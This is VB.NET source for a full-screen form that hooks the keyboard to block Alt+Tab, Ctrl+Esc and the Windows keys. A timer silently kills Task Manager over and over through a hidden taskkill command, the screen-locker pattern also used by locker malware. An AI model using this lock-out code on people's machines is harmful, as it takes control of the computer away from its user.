Public Class Form2
    Private formState As New FormState
    Private processo As Process
    Declare Function SetWindowsHookEx Lib "user32" Alias "SetWindowsHookExA" (ByVal idHook As Integer, ByVal lpfn As LowLevelKeyboardProcDelegate, ByVal hMod As IntPtr, ByVal dwThreadId As Integer) As IntPtr
    Declare Function UnhookWindowsHookEx Lib "user32" Alias "UnhookWindowsHookEx" (ByVal hHook As IntPtr) As Boolean
    Declare Function CallNextHookEx Lib "user32" Alias "CallNextHookEx" (ByVal hHook As IntPtr, ByVal nCode As Integer, ByVal wParam As Integer, ByRef lParam As KBDLLHOOKSTRUCT) As Integer
    Delegate Function LowLevelKeyboardProcDelegate(ByVal nCode As Integer, ByVal wParam As Integer, ByRef lParam As KBDLLHOOKSTRUCT) As Integer

    Const WH_KEYBOARD_LL As Integer = 13

    Structure KBDLLHOOKSTRUCT
        Dim vkCode As Integer
        Dim scanCode As Integer
        Dim flags As Integer
        Dim time As Integer
        Dim dwExtraInfo As Integer
    End Structure

    Dim intLLKey As IntPtr

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        UnhookWindowsHookEx(intLLKey)
        Application.Exit()
    End Sub

    Private Sub Form2_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Timer1.Start()
        formState.Maximize(Me)
        intLLKey = SetWindowsHookEx(WH_KEYBOARD_LL, AddressOf LowLevelKeyboardProc, IntPtr.Zero, 0)
    End Sub

    Private Sub frmMain_Closing(ByVal sender As Object, ByVal e As System.ComponentModel.CancelEventArgs) Handles MyBase.Closing

    End Sub

    Private Function LowLevelKeyboardProc(ByVal nCode As Integer, ByVal wParam As Integer, ByRef lParam As KBDLLHOOKSTRUCT) As Integer
        Dim blnEat As Boolean = False
        Select Case wParam
            Case 256, 257, 260, 261
                'Alt+Tab, Alt+Esc, Ctrl+Esc, Windows Key    
                blnEat = ((lParam.vkCode = 9) AndAlso (lParam.flags = 32)) Or _
                ((lParam.vkCode = 27) AndAlso (lParam.flags = 32)) Or _
                ((lParam.vkCode = 27) AndAlso (lParam.flags = 0)) Or _
                ((lParam.vkCode = 91) AndAlso (lParam.flags = 1)) Or _
                ((lParam.vkCode = 92) AndAlso (lParam.flags = 1))
        End Select

        If blnEat = True Then
            Return 1
        Else
            Return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam)
        End If
    End Function

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        'For Each selProcess As Process In Process.GetProcesses
        '    If selProcess.ProcessName = "taskmgr" Then
        '        selProcess.Kill()
        '        Exit For
        '    End If
        'Next
        'If Process.GetCurrentProcess.ProcessName = "taskmgr" Then
        '    Process.GetCurrentProcess.Kill()
        'End If
        Shell("taskkill -im taskmgr.exe", vbHide)
    End Sub

End Class